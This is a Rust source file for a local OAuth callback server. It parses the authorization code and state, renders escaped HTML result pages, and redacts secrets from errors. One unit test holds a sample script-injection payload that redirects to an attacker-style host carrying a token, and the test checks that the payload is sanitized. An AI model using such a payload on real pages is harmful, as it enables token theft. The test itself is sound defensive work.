use anyhow::{Context, Result};
use kordi_provider::ProviderError;
use std::collections::HashMap;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;
use tokio::sync::oneshot;

/// Result received from the browser redirect.
#[derive(Debug, Clone)]
pub struct CallbackParams {
    pub code: String,
    pub state: String,
}

/// Handle to a running callback server.
pub struct CallbackServer {
    /// Resolves once the browser hits the callback URL.
    pub result_rx: oneshot::Receiver<Result<CallbackParams>>,
    /// Drop or send to cancel the listener task.
    cancel_tx: oneshot::Sender<()>,
}

/// Destructured parts of a `CallbackServer`, useful for `tokio::select!`.
pub struct CallbackServerParts {
    pub result_rx: oneshot::Receiver<Result<CallbackParams>>,
    pub cancel_tx: oneshot::Sender<()>,
}

impl CallbackServer {
    /// Destructure into individual fields so they can be used in
    /// `tokio::select!` without partial-move issues.
    pub fn into_parts(self) -> CallbackServerParts {
        CallbackServerParts {
            result_rx: self.result_rx,
            cancel_tx: self.cancel_tx,
        }
    }
}

/// Start a one-shot HTTP server on `127.0.0.1:{port}` that waits for a GET
/// to `expected_path` (e.g. `/callback`) carrying `code` and `state` query
/// parameters.
pub async fn start_callback_server(port: u16, expected_path: &str) -> Result<CallbackServer> {
    let listener = TcpListener::bind(format!("127.0.0.1:{port}"))
        .await
        .with_context(|| format!("Failed to bind callback server on port {port}"))?;

    let (result_tx, result_rx) = oneshot::channel();
    let (cancel_tx, cancel_rx) = oneshot::channel::<()>();
    let path = expected_path.to_string();

    tokio::spawn(async move {
        tokio::select! {
            _ = cancel_rx => {}
            accepted = listener.accept() => {
                let result = match accepted {
                    Ok((stream, _addr)) => handle_connection(stream, &path).await,
                    Err(e) => Err(anyhow::anyhow!("Accept failed: {e}")),
                };
                let _ = result_tx.send(result);
            }
        }
    });

    Ok(CallbackServer {
        result_rx,
        cancel_tx,
    })
}

async fn handle_connection(
    mut stream: tokio::net::TcpStream,
    expected_path: &str,
) -> Result<CallbackParams> {
    let mut buf = vec![0u8; 4096];
    let n = stream
        .read(&mut buf)
        .await
        .context("Failed to read from callback connection")?;
    let request = String::from_utf8_lossy(&buf[..n]);

    // Parse the request line: "GET /callback?code=...&state=... HTTP/1.1"
    let request_line = request.lines().next().unwrap_or("");
    let parts: Vec<&str> = request_line.split_whitespace().collect();

    if parts.len() < 2 || parts[0] != "GET" {
        send_response(&mut stream, 400, "Bad Request", "Expected GET request").await;
        anyhow::bail!("OAuth callback did not use GET");
    }

    let full_path = parts[1];
    let (path_part, query_part) = full_path.split_once('?').unwrap_or((full_path, ""));

    if path_part != expected_path {
        send_response(
            &mut stream,
            404,
            "Not Found",
            "This sign-in callback is not valid. Try again from the app.",
        )
        .await;
        anyhow::bail!("Unexpected OAuth callback path");
    }

    let params = parse_query(query_part);

    let code = params.get("code").cloned().unwrap_or_default();
    let state = params.get("state").cloned().unwrap_or_default();

    if code.is_empty() {
        // Check for error
        let error = params.get("error").cloned().unwrap_or_default();
        let desc = params
            .get("error_description")
            .cloned()
            .unwrap_or_else(|| "Unknown error".into());
        let msg = if error.is_empty() {
            "Missing 'code' parameter".to_string()
        } else {
            format!("{error}: {desc}")
        };
        let sensitive_values = vec![state];
        let safe_message = ProviderError::stream_with_sensitive_values(
            "oauth",
            "callback",
            Some(&msg),
            (!error.is_empty()).then_some(error.as_str()),
            &sensitive_values,
        )
        .to_string();
        let friendly_body = if error.is_empty() {
            "The provider did not return a valid code. Try again from the app."
        } else {
            "The provider stopped the sign-in flow. Try again from the app."
        };
        send_response(&mut stream, 400, "Couldn’t sign in", friendly_body).await;
        anyhow::bail!("OAuth callback error: {safe_message}");
    }

    send_response(
        &mut stream,
        200,
        "Signed in",
        "Your account is connected. You can close this window and return to the app.",
    )
    .await;

    Ok(CallbackParams { code, state })
}

fn parse_query(query: &str) -> HashMap<String, String> {
    query
        .split('&')
        .filter(|s| !s.is_empty())
        .filter_map(|pair| {
            let (k, v) = pair.split_once('=')?;
            Some((url_decode(k), url_decode(v)))
        })
        .collect()
}

fn url_decode(s: &str) -> String {
    let mut result = String::with_capacity(s.len());
    let mut chars = s.bytes();
    while let Some(b) = chars.next() {
        match b {
            b'%' => {
                let hi = chars.next().unwrap_or(b'0');
                let lo = chars.next().unwrap_or(b'0');
                let hex = [hi, lo];
                if let Ok(s) = std::str::from_utf8(&hex)
                    && let Ok(val) = u8::from_str_radix(s, 16)
                {
                    result.push(val as char);
                    continue;
                }
                result.push('%');
                result.push(hi as char);
                result.push(lo as char);
            }
            b'+' => result.push(' '),
            _ => result.push(b as char),
        }
    }
    result
}

fn html_escape(value: &str) -> String {
    value
        .replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#39;")
}

fn render_auth_response_page(title: &str, body: &str) -> String {
    let title = html_escape(title);
    let body = html_escape(body);
    format!(
        r#"<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>{title}</title>
  <style>
    :root {{ color-scheme: dark light; }}
    * {{ box-sizing: border-box; }}
    body {{
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      padding: 24px;
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", system-ui, sans-serif;
      background:
        radial-gradient(circle at 50% -18%, color-mix(in oklab, #f5f7fb 16%, transparent), transparent 34rem),
        linear-gradient(180deg, #222427 0%, #111316 62%, #0c0d0f 100%);
      color: #f7f8fb;
    }}
    main {{
      width: min(100%, 470px);
      border: 1px solid color-mix(in oklab, white 13%, transparent);
      border-radius: 30px;
      background: linear-gradient(180deg, rgba(35, 37, 41, .88), rgba(18, 19, 22, .96));
      box-shadow: 0 28px 88px rgba(0, 0, 0, .32), inset 0 1px 0 rgba(255, 255, 255, .035);
      padding: 36px 32px;
    }}
    h1 {{
      margin: 0 0 12px;
      font-size: clamp(34px, 8vw, 46px);
      line-height: .96;
      letter-spacing: -.055em;
      color: #ffffff;
    }}
    p {{
      margin: 0;
      max-width: 34ch;
      color: #c4cbd6;
      font-size: 15px;
      line-height: 1.62;
    }}
    @media (prefers-color-scheme: light) {{
      body {{
        background:
          radial-gradient(circle at 50% -18%, rgba(120, 133, 155, .18), transparent 34rem),
          linear-gradient(180deg, #f6f7f9, #eceff3);
        color: #15181d;
      }}
      main {{
        border-color: rgba(31, 41, 55, .10);
        background: rgba(255, 255, 255, .94);
        box-shadow: 0 24px 72px rgba(31, 41, 55, .13), inset 0 1px 0 rgba(255, 255, 255, .8);
      }}
      h1 {{ color: #15181d; }}
      p {{ color: #5b6472; }}
    }}
  </style>
</head>
<body>
  <main>
    <h1>{title}</h1>
    <p>{body}</p>
  </main>
</body>
</html>"#,
    )
}

async fn send_response(stream: &mut tokio::net::TcpStream, status: u16, title: &str, body: &str) {
    let html = render_auth_response_page(title, body);
    let reason = match status {
        200 => "OK",
        400 => "Bad Request",
        404 => "Not Found",
        _ => "OK",
    };
    let response = format!(
        "HTTP/1.1 {status} {reason}\r\n\
         Content-Type: text/html; charset=utf-8\r\n\
         Content-Length: {}\r\n\
         Connection: close\r\n\
         \r\n\
         {html}",
        html.len()
    );
    let _ = stream.write_all(response.as_bytes()).await;
    let _ = stream.flush().await;
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn auth_success_page_is_compact_and_has_no_brand_label_box() {
        let html = render_auth_response_page(
            "Signed in",
            "Your account is connected. You can close this window and return to the app.",
        );

        assert!(html.contains("Signed in"));
        assert!(html.contains("return to the app"));
        assert!(!html.contains("Close window"));
        assert!(!html.contains("<button"));
        assert!(!html.contains("Kordi Authentication"));
        assert!(!html.contains("KORDI AUTHENTICATION"));
        assert!(!html.contains("text-transform:uppercase"));
        assert!(!html.contains("Authentication Successful"));
    }

    #[test]
    fn auth_error_page_uses_clear_retry_copy_without_internal_details() {
        let html = render_auth_response_page(
            "Couldn’t sign in",
            "The provider did not return a valid code. Try again from the app.",
        );

        assert!(html.contains("Couldn’t sign in"));
        assert!(html.contains("Try again from the app"));
        assert!(!html.contains("Kordi Authentication"));
        assert!(!html.contains("Missing 'code' parameter"));
        assert!(!html.contains("OAuth callback"));
    }

    #[test]
    fn callback_errors_sanitize_reflected_state_urls_and_markup() {
        let sensitive_values = vec!["state-secret-123".to_string()];
        let error = ProviderError::stream_with_sensitive_values(
            "oauth",
            "callback",
            Some(
                "access_denied: state-secret-123 at https://example.com/callback?code=query-secret",
            ),
            Some("access_denied"),
            &sensitive_values,
        );
        let rendered = error.to_string();

        assert!(rendered.contains("[redacted]"));
        assert!(rendered.contains("https://example.com/callback"));
        assert!(!rendered.contains("state-secret-123"));
        assert!(!rendered.contains("query-secret"));

        let markup = ProviderError::stream(
            "oauth",
            "callback",
            Some("<script>window.location='https://evil.test/?token=secret'</script>"),
            Some("access_denied"),
        );
        assert_eq!(markup.to_string(), "Unknown error");
    }
}
